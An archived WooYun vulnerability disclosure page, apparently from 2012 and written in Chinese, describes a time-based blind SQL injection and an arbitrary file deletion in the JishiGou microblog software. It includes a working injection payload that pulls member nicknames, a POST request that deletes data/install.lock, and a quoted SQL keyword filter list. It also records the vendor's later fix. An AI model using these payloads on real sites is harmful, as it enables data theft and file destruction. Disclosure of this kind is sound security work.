@@ -1,0 +1,256 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		记事狗盲注及任意文件删除  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		记事狗盲注及任意文件删除  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/yy520">yy520</a> 
+</li><li>提交时间：		2012-06-30 12:34</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-30：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-07-05：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">0x1 盲注<br />
+0x2 任意文件删除</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">0x1 盲注<br />
+<br />
+在modules/ajax/topic.mod.php中<br />
+<br />
+</p><pre><code>function Group_fields()<br />
+	{<br />
+		$uid   = MEMBER_ID;<br />
+		$g_id  =  $this-&gt;Post[&#039;gid&#039;];<br />
+		$touid =  $this-&gt;Post[&#039;touid&#039;];<br />
+<br />
+		$sql=&quot;SELECT * FROM &quot;.TABLE_PREFIX.&#039;group&#039;.&quot; WHERE uid =&quot;.MEMBER_ID.&quot; and id=&quot;.$g_id;<br />
+		$query = $this-&gt;DatabaseHandler-&gt;Query($sql);<br />
+		$group_info=$query-&gt;GetRow();<br />
+<br />
+				$sql=&quot;SELECT `uid` FROM &quot;.TABLE_PREFIX.&#039;members&#039;.&quot; WHERE uid=&quot;.$touid;<br />
+		$query = $this-&gt;DatabaseHandler-&gt;Query($sql);<br />
+		$member_info=$query-&gt;GetRow();<br />
+<br />
+				$sql=&quot;SELECT `touid`,`display` FROM &quot;.TABLE_PREFIX.&#039;groupfields&#039;.&quot; WHERE touid <br />
+=&#039;{$touid}&#039; and gid=&quot;.$g_id;<br />
+		$query = $this-&gt;DatabaseHandler-&gt;Query($sql);<br />
+		$fields_info=$query-&gt;GetRow();<br />
+<br />
+		…...//省略<br />
+	}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+$gid和$touid没做过滤，直接带入查询，但是查询之前经过了CheckQuery()检测，去除了一些关键字符，但是没有去除完整。<br />
+<br />
+</p><pre><code>$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dfunction&#039;][&#039;0&#039;] = &#039;load_file&#039;;<br />
+			$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dfunction&#039;][&#039;1&#039;] = &#039;hex&#039;;<br />
+			$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dfunction&#039;][&#039;2&#039;] = &#039;substring&#039;;<br />
+			$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dfunction&#039;][&#039;4&#039;] = &#039;ord&#039;;<br />
+			$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dfunction&#039;][&#039;5&#039;] = &#039;char&#039;;<br />
+			$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;daction&#039;][&#039;0&#039;] = &#039;intooutfile&#039;;<br />
+			$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;daction&#039;][&#039;1&#039;] = &#039;intodumpfile&#039;;<br />
+			$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;daction&#039;][&#039;2&#039;] = &#039;unionselect&#039;;<br />
+			$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;daction&#039;][&#039;4&#039;] = &#039;unionall&#039;;<br />
+			$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;daction&#039;][&#039;5&#039;] = &#039;uniondistinct&#039;;<br />
+			$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dnote&#039;][&#039;0&#039;] = &#039;/&#039;.&#039;*&#039;;<br />
+			$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dnote&#039;][&#039;1&#039;] = &#039;*/&#039;;<br />
+			$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dnote&#039;][&#039;2&#039;] = &#039;#&#039;;<br />
+			$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dnote&#039;][&#039;3&#039;] = &#039;--&#039;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+过滤了substring(其实我才知道mysql也可以用substring)，没过滤substr,<br />
+<br />
+利用基于时间的盲注可以突破，最后构造一个post包，发送到ajax.php?code=group_fields <br />
+<br />
+底下参数填写：<br />
+<br />
+gid=1 or if(substr((select nickname from jishigou_members limit 0,1),1,1)=0x61,sleep(1),1)&amp;touid=34<br />
+<br />
+<br />
+<br />
+最后执行的语句为：<br />
+<br />
+SELECT * FROM jishigou_group WHERE uid =0 and id=1 or if(substr((select nickname from jishigou_members limit 0,1),1,1)=0x61,sleep(1),1)<br />
+<br />
+<br />
+<br />
+唉～～ 给那两个参数加个intval 把<br />
+<br />
+<br />
+<br />
+0x2 任意文件删除<br />
+<br />
+在modules/ajax/event.mod.php中<br />
+<br />
+</p><pre><code>function onloadPic(){<br />
+        <br />
+        <br />
+        Load::lib(&#039;image&#039;);<br />
+        <br />
+        $image = new image();<br />
+		Load::lib(&#039;upload&#039;);<br />
+		unlink($this-&gt;Post[&#039;hid_pic&#039;]);<br />
+        if($_FILES[&#039;pic&#039;][&#039;name&#039;]){<br />
+	…../省略<br />
+	}<br />
+	…../省略<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+hid_pic 没经过过滤，直接被unlink，这个漏洞需要至少普通用户的权限<br />
+<br />
+所以我们构造一个post包，提交到/ajax.php?code=onloadPic&amp;mod=event<br />
+<br />
+底下的参数填写 hid_pic=want_to_delete_file<br />
+<br />
+即可把相应的文件删除～<br />
+<br />
+本地测试删除data/install.lock成功，官网删除data/install.lock没成功？？ 权限问题？？？ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">没什么好证明的 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">do it your self </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/yy520" title="yy520">yy520</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-09060" title="记事狗盲注及任意文件删除">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2012-06-30 12:34</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2012-07-09：漏洞已经确认，是有存在，安全危害评级18，由于设计缺陷产生此漏洞，官方已经发布新版修复相关问题，望广大用户及时更新升级到最新。3.6.0版本已经修复此问题。
+在此再次感谢白帽子@yy520 ，也再次表达我们工作疏忽没有及时确认更新漏洞状态的歉意。</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="9060";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
